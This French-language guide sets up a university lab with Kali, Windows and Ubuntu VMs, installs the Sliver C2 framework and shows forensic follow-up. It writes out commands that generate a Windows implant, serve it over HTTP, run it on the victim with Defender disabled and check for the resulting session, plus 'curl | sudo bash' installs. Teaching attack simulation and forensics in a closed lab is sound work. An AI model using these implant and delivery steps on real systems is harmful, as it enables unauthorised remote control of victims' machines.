# GUIDE D'INSTALLATION PAS À PAS - PROJET M1 SILVER C2
## Installation Complète et Première Utilisation

### 🎯 **Objectif**
Ce guide vous accompagne étape par étape pour installer et utiliser pour la première fois le package complet Projet M1 Silver C2.

**Durée totale estimée : 2-3 heures**

---

## 📋 **ÉTAPE 1 : PRÉREQUIS ET PRÉPARATION** (15 min)

### Matériel Requis
- **Ordinateur hôte** : 16 GB RAM minimum (32 GB recommandé)
- **Espace disque** : 200 GB libres minimum
- **Virtualisation** : VirtualBox 6.1+ ou VMware Workstation 15+
- **Connexion Internet** : Pour téléchargements et mises à jour

### Logiciels à Télécharger
1. **VirtualBox** : https://www.virtualbox.org/wiki/Downloads
2. **Kali Linux ISO** : https://www.kali.org/get-kali/#kali-installer-images
3. **Windows 10 ISO** : https://www.microsoft.com/software-download/windows10
4. **Ubuntu 22.04 LTS ISO** : https://ubuntu.com/download/desktop

### Vérification de la Virtualisation
```bash
# Sur Linux/macOS
egrep -c '(vmx|svm)' /proc/cpuinfo

# Sur Windows (PowerShell en tant qu'admin)
Get-ComputerInfo | Select-Object HyperVRequirementVirtualizationFirmwareEnabled
```

---

## 🖥️ **ÉTAPE 2 : CRÉATION DES MACHINES VIRTUELLES** (45 min)

### VM1 - Kali Linux (Attaquant)
```
Configuration VM :
- Nom : VM1-Kali-Attacker
- Type : Linux
- Version : Debian (64-bit)
- RAM : 4 GB (8 GB si possible)
- Disque : 60 GB (dynamique)
- CPU : 2 cœurs
- Réseau 1 : NAT (pour Internet)
- Réseau 2 : Host-Only Adapter
```

**Installation Kali :**
1. Monter l'ISO Kali Linux
2. Démarrer la VM
3. Choisir "Graphical Install"
4. Configuration :
   - Langue : Français (ou English)
   - Pays : France
   - Clavier : Français
   - Nom d'hôte : kali-attacker
   - Utilisateur : kali
   - Mot de passe : (votre choix, ex: kali)
5. Partitionnement : "Assisté - utiliser un disque entier"
6. Terminer l'installation et redémarrer

### VM2 - Windows 10 (Victime)
```
Configuration VM :
- Nom : VM2-Windows-Victim  
- Type : Microsoft Windows
- Version : Windows 10 (64-bit)
- RAM : 4 GB
- Disque : 80 GB (dynamique)
- CPU : 2 cœurs
- Réseau : Host-Only Adapter uniquement
```

**Installation Windows 10 :**
1. Monter l'ISO Windows 10
2. Démarrer la VM
3. Suivre l'installation standard
4. Configuration :
   - Nom d'ordinateur : VICTIM-PC
   - Utilisateur : victim
   - Mot de passe : Password123
5. **IMPORTANT** : Désactiver Windows Defender temporairement

### VM3 - Ubuntu (Analyste)
```
Configuration VM :
- Nom : VM3-Ubuntu-Analyst
- Type : Linux  
- Version : Ubuntu (64-bit)
- RAM : 8 GB (minimum 6 GB)
- Disque : 100 GB (dynamique)
- CPU : 4 cœurs
- Réseau 1 : NAT (pour Internet)
- Réseau 2 : Host-Only Adapter
```

**Installation Ubuntu :**
1. Monter l'ISO Ubuntu 22.04
2. Démarrer la VM
3. Choisir "Try or Install Ubuntu"
4. Configuration :
   - Nom : analyst
   - Nom d'ordinateur : ubuntu-analyst
   - Mot de passe : analyst123
5. Installation normale avec mises à jour

---

## 🌐 **ÉTAPE 3 : CONFIGURATION RÉSEAU** (20 min)

### Configuration VirtualBox Host-Only
```bash
# Créer le réseau Host-Only
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
```

### Configuration IP sur chaque VM

**VM1 (Kali) :**
```bash
# Se connecter en SSH ou console directe
sudo nano /etc/netplan/01-netcfg.yaml

# Contenu du fichier :
network:
  version: 2
  ethernets:
    eth0:
      dhcp4: true  # NAT pour Internet
    eth1:
      dhcp4: false
      addresses: [192.168.56.10/24]

# Appliquer la configuration
sudo netplan apply
```

**VM2 (Windows) :**
```powershell
# Ouvrir PowerShell en tant qu'administrateur
netsh interface ip set address "Ethernet" static 192.168.56.20 255.255.255.0 192.168.56.1
```

**VM3 (Ubuntu) :**
```bash
sudo nano /etc/netplan/01-network-manager-all.yaml

# Ajouter la configuration Host-Only
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: true  # NAT pour Internet
    enp0s8:
      dhcp4: false
      addresses: [192.168.56.30/24]

sudo netplan apply
```

### Test de Connectivité
```bash
# Depuis VM1 (Kali)
ping -c 3 192.168.56.20  # VM2
ping -c 3 192.168.56.30  # VM3

# Depuis VM3 (Ubuntu)
ping -c 3 192.168.56.10  # VM1
ping -c 3 192.168.56.20  # VM2
```

---

## 📥 **ÉTAPE 4 : TÉLÉCHARGEMENT DU PACKAGE PROJET M1** (10 min)

### Sur VM1 (Kali)
```bash
# Créer le répertoire de travail
mkdir -p ~/projet-m1-package
cd ~/projet-m1-package

# Télécharger tous les fichiers que j'ai créés
# (Vous devrez copier tous les fichiers .md, .sh, .py depuis notre conversation)

# Exemple : copier le contenu de chaque fichier dans des nouveaux fichiers
nano guide-silver-c2-kali.md
# Coller le contenu du guide complet

nano projet-m1-infrastructure-setup.md
# Coller le contenu du guide d'infrastructure

# Répéter pour tous les fichiers créés...
```

### Structure des Fichiers à Créer
```
~/projet-m1-package/
├── guides/
│   ├── guide-silver-c2-kali.md
│   ├── projet-m1-infrastructure-setup.md
│   ├── projet-m1-silver-c2-setup.md
│   ├── projet-m1-scenarios-attaque.md
│   ├── projet-m1-investigation-forensique.md
│   └── projet-m1-templates-rapport.md
├── scripts/
│   ├── install-silver-c2.sh
│   ├── exemples-scripts-silver.py
│   └── silver-c2-cheatsheet.md
└── automatisation/
    ├── projet-m1-scripts-automatisation-partie1.md
    ├── projet-m1-scripts-automatisation-partie2.md
    └── projet-m1-scripts-automatisation-partie3-finale.md
```

---

## ⚡ **ÉTAPE 5 : INSTALLATION DE SILVER C2** (30 min)

### Sur VM1 (Kali)
```bash
# Rendre le script d'installation exécutable
chmod +x install-silver-c2.sh

# Lancer l'installation automatique
./install-silver-c2.sh

# Si le script automatique échoue, installation manuelle :
```

### Installation Manuelle Silver C2
```bash
# 1. Installer Go
GO_VERSION="1.21.5"
wget https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go${GO_VERSION}.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc

# 2. Vérifier Go
go version

# 3. Installer Silver C2
curl https://sliver.sh/install | sudo bash

# 4. Vérifier l'installation
sliver-server version
sliver-client version
```

### Configuration Initiale
```bash
# Créer la structure du projet
mkdir -p ~/project-m1/{config,payloads,logs,evidence,reports,scripts}

# Extraire et configurer tous les scripts depuis les fichiers MD
# (Copier le contenu des scripts des fichiers d'automatisation)

# Rendre les scripts exécutables
chmod +x ~/project-m1/scripts/*.sh
chmod +x ~/project-m1/scripts/*.py
```

---

## 🔧 **ÉTAPE 6 : CONFIGURATION DU PROJET M1** (20 min)

### Déploiement des Scripts
```bash
# Depuis les fichiers MD d'automatisation, extraire les scripts :

# 1. setup-project-m1.sh (depuis partie 1)
nano ~/project-m1/scripts/setup-project-m1.sh
# Coller le contenu du script complet

# 2. attack-automation.py (depuis partie 1)
nano ~/project-m1/scripts/attack-automation.py
# Coller le contenu du script complet

# 3. project-orchestrator.py (depuis partie 3)
nano ~/project-m1/scripts/project-orchestrator.py
# Coller le contenu du script complet

# 4. project-validator.sh (depuis partie 3)
nano ~/project-m1/scripts/project-validator.sh
# Coller le contenu du script complet

# 5. project-reset.sh (depuis partie 3)
nano ~/project-m1/scripts/project-reset.sh
# Coller le contenu du script complet

# Rendre tous les scripts exécutables
chmod +x ~/project-m1/scripts/*
```

### Configuration Initiale du Projet
```bash
# Lancer la configuration automatique
cd ~/project-m1/scripts
./setup-project-m1.sh

# Si succès, validation du système
./project-validator.sh
```

---

## 🔍 **ÉTAPE 7 : INSTALLATION DES OUTILS FORENSIQUES (VM3)** (45 min)

### Sur VM3 (Ubuntu)
```bash
# Mise à jour du système
sudo apt update && sudo apt upgrade -y

# Installation des outils forensiques de base
sudo apt install -y volatility3 sleuthkit autopsy
sudo apt install -y python3-pip git curl wget

# Installation Volatility depuis les sources (version la plus récente)
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
pip3 install -r requirements.txt
python3 setup.py install --user

# Vérification des installations
vol --help
sleuthkit --version
```

### Téléchargement de Belkasoft RAM Capturer (VM2)
```powershell
# Sur VM2 (Windows), télécharger depuis :
# https://belkasoft.com/ram-capturer

# Créer les répertoires nécessaires
New-Item -ItemType Directory -Path "C:\Tools\BelkasoftRAMCapturer" -Force
New-Item -ItemType Directory -Path "C:\Evidence" -Force
```

---

## 🚀 **ÉTAPE 8 : PREMIÈRE UTILISATION** (30 min)

### Test de Connectivité Complète
```bash
# Sur VM1 (Kali)
cd ~/project-m1/scripts

# Test de connectivité réseau
ping -c 2 192.168.56.20  # VM2
ping -c 2 192.168.56.30  # VM3

# Validation complète du système
./project-validator.sh
```

### Lancement de la Première Simulation
```bash
# Mode interactif recommandé pour la première fois
python3 project-orchestrator.py

# Sélectionner option 1 : "Vérifier les prérequis"
# Puis option 3 : "Workflow étape par étape"
```

### Étapes de la Première Simulation

**1. Démarrage Silver C2**
```bash
# L'orchestrateur propose de démarrer Silver
# Ou manuellement :
sudo sliver-server daemon --lhost 192.168.56.10 --lport 31337 &

# Dans un nouveau terminal :
sliver-client
# Vérifier que la connexion fonctionne
```

**2. Génération du Premier Payload**
```bash
# Dans la console Silver
sliver > http --lhost 192.168.56.10 --lport 8080
sliver > generate --http 192.168.56.10:8080 --os windows --arch amd64 --format exe --save ~/project-m1/payloads/test-payload.exe
```

**3. Test de Connectivité Payload**
```bash
# Démarrer un serveur HTTP simple pour servir le payload
cd ~/project-m1/payloads
python3 -m http.server 8000

# Sur VM2 (Windows), télécharger via navigateur :
# http://192.168.56.10:8000/test-payload.exe
```

**4. Exécution et Vérification de Session**
```powershell
# Sur VM2, exécuter le payload (Windows Defender doit être désactivé)
# Double-cliquer sur le fichier téléchargé

# Sur VM1, vérifier la session dans Silver
sliver > sessions
# Vous devriez voir une nouvelle session active
```

---

## ✅ **ÉTAPE 9 : VALIDATION DE L'INSTALLATION** (15 min)

### Checklist de Validation
```bash
# Sur VM1 (Kali)
echo "=== VALIDATION PROJET M1 ==="

# 1. Silver C2 fonctionne
pgrep -f sliver-server && echo "✅ Silver serveur actif" || echo "❌ Silver serveur arrêté"

# 2. Connectivité réseau
ping -c 1 192.168.56.20 > /dev/null && echo "✅ VM2 accessible" || echo "❌ VM2 inaccessible"
ping -c 1 192.168.56.30 > /dev/null && echo "✅ VM3 accessible" || echo "❌ VM3 inaccessible"

# 3. Scripts présents
[ -f ~/project-m1/scripts/project-orchestrator.py ] && echo "✅ Orchestrateur présent" || echo "❌ Orchestrateur manquant"

# 4. Payload généré
[ -f ~/project-m1/payloads/test-payload.exe ] && echo "✅ Payload généré" || echo "❌ Payload manquant"

# 5. Session Silver active
sliver-client -c "sessions" | grep -q "session_" && echo "✅ Session active" || echo "❌ Aucune session"
```

### Test de Génération de Rapport
```bash
# Sur VM3 (Ubuntu), tester la génération de rapport
mkdir -p ~/forensics/reports
echo "Test de génération de rapport..." > ~/forensics/reports/test-report.txt
ls -la ~/forensics/reports/
```

---

## 🎉 **PREMIÈRE SIMULATION COMPLÈTE** (45 min)

### Lancement du Workflow Automatique
```bash
# Sur VM1 (Kali)
cd ~/project-m1/scripts

# Mode automatique complet
python3 project-orchestrator.py --mode auto

# Ou mode interactif étape par étape (recommandé)
python3 project-orchestrator.py
# Sélectionner option 2 : "Workflow complet automatique"
```

### Actions Manuelles Requises
1. **Sur VM2** : Exécuter le payload quand demandé
2. **Sur VM2** : Lancer la collecte de preuves avec Belkasoft
3. **Sur VM3** : Vérifier que les outils forensiques fonctionnent

### Vérification des Résultats
```bash
# Vérifier les artefacts créés
ls -la ~/project-m1/evidence/
ls -la ~/project-m1/reports/
ls -la ~/project-m1/logs/

# Sur VM3, vérifier l'analyse
ls -la ~/forensics/analysis/
ls -la ~/forensics/reports/
```

---

## 🛠️ **DÉPANNAGE COMMUN**

### Problème : Silver C2 ne démarre pas
```bash
# Solution 1 : Vérifier Go
go version
export PATH=$PATH:/usr/local/go/bin

# Solution 2 : Réinstaller Silver
sudo rm -rf ~/.sliver
curl https://sliver.sh/install | sudo bash
```

### Problème : VMs ne communiquent pas
```bash
# Vérifier la configuration réseau VirtualBox
VBoxManage list hostonlyifs
VBoxManage showvminfo VM1-Kali-Attacker | grep NIC

# Reconfigurer si nécessaire
VBoxManage modifyvm VM1-Kali-Attacker --nic2 hostonly --hostonlyadapter2 vboxnet0
```

### Problème : Payload non généré
```bash
# Vérifier que Silver serveur est démarré
sudo sliver-server daemon --log-level debug

# Test de génération manuelle
sliver-client -c "generate --http 127.0.0.1:8080 --os windows --format exe"
```

---

## 🎯 **PROCHAINES ÉTAPES**

Une fois l'installation validée :

1. **📚 Étudier la documentation complète** dans les guides créés
2. **🎯 Pratiquer les scénarios d'attaque** étape par étape
3. **🔍 Maîtriser les outils forensiques** sur des échantillons
4. **📊 Personnaliser les rapports** selon vos besoins
5. **🔄 Utiliser le reset** pour de nouvelles simulations

---

**🎉 FÉLICITATIONS ! Votre environnement Projet M1 Silver C2 est maintenant opérationnel !**

Pour toute question ou problème, consultez la documentation complète ou les logs détaillés générés par les scripts.